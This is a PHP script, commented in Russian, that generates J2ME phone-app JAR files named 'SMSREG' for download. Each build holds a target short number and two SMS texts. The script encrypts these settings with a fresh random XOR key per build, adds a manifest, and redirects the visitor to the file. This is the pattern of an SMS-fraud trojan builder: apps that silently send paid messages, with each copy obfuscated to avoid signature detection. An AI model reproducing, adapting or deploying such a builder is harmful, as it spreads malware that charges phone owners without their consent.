<?
// Генератор с шифровкой динамическим ключом.
$main = 'Первое окно.';
$info = 'Спасибо, за то, что воспользовались нашими услугами.'; // текст, который выводится в конце
$number = '1000'; // номер смс
$text1 = 'test1'; // текст первого смс
$pause1 = 100; // мс
$text2 = 'test2'; // текст второго смс
$pause2 = 100; // мс
$name = 'SMSREG'; // Название приложения, англ буквами
$lifetime = 60 * 10; // Время жизни сгенерирванных файлов в кеше, в сек.

// **************************************************** //
require_once 'pclzip.lib.php';
// clear
$files = glob('./jar/*');
$time = time();
foreach ($files as $f) {
    if (!is_dir($f)) {
        continue;
    }
    if ($time - @filectime($f) >= $lifetime) {
        unlink($f.'/info.dat');
        unlink($f.'/MANIFEST.MF');
        $jars = glob($f.'/*.jar');
        foreach ($jars as $j) {
            unlink($j);
        }
        rmdir($f);
    }
}
// keygen
$key = '';
$keysize = rand(32, 64);
for ($i = 0; $i < $keysize; $i++) {
    $key .= chr(rand(64, 190));
}
// init
$tmp_id = time().'_'.rand(10000, 99999);
$tmp_dir = 'jar/'.$tmp_id.'/';
$tmp_info = 'jar/'.$tmp_id.'/info.dat';
$tmp_man = 'jar/'.$tmp_id.'/MANIFEST.MF';
$tmp_file = 'jar/'.$tmp_id.'/'.$name.'.jar';

if (!mkdir($tmp_dir, 0777)) {
    die('Error: create dir');
}
if (!($f = @fopen($tmp_info, 'w+'))) {
    die('Error: create info file');
} else {
    $src = $main.';'.$info.';'.$number.';'.$text1.';'.$text2.';'.$pause1.';'.$pause2.';';
    $data = '';
    $p = 0;
    for ($i = strlen($src) - 1; $i >= 0; $i--) {      
        $data = chr(ord(substr($src, $i, 1)) ^ ord($key{$p})).$data;
        $p++;
        if ($p == strlen($key)) {
            $p = 0;
        }
    }
    fputs($f, chr($keysize).$key.$data);
    fclose($f);
}
if (!($f = @fopen($tmp_man, 'w+'))) {
    die('Error: create manifest file');
} else {
    fputs($f, "Manifest-Version: 1.0\nAnt-Version: Apache Ant 1.8.1\nCreated-By: 1.6.0_22-b04 (Sun Microsystems Inc.)\nMIDlet-1: {$name}, /icon.png, Midlet\nMIDlet-Name: {$name}\nMIDlet-Vendor: V\nMIDlet-Version: 1.0\nMicroEdition-Configuration: CLDC-1.0\nMicroEdition-Profile: MIDP-2.0\n");
    fclose($f);
}

$zip = new PclZip($tmp_file);
$v_list = $zip->add('files/', PCLZIP_OPT_REMOVE_PATH, 'files/');
if ($v_list == 0) {
    die("Error : ".$zip->errorInfo(true));
}
$v_list = $zip->add($tmp_info, PCLZIP_OPT_REMOVE_PATH, $tmp_dir);
if ($v_list == 0) {
    die("Error : ".$zip->errorInfo(true));
}
$v_list = $zip->add($tmp_man, PCLZIP_OPT_ADD_PATH, 'META-INF/', PCLZIP_OPT_REMOVE_PATH, $tmp_dir);
if ($v_list == 0) {
    die("Error : ".$zip->errorInfo(true));
}
header('Location: '.$tmp_file);
?>
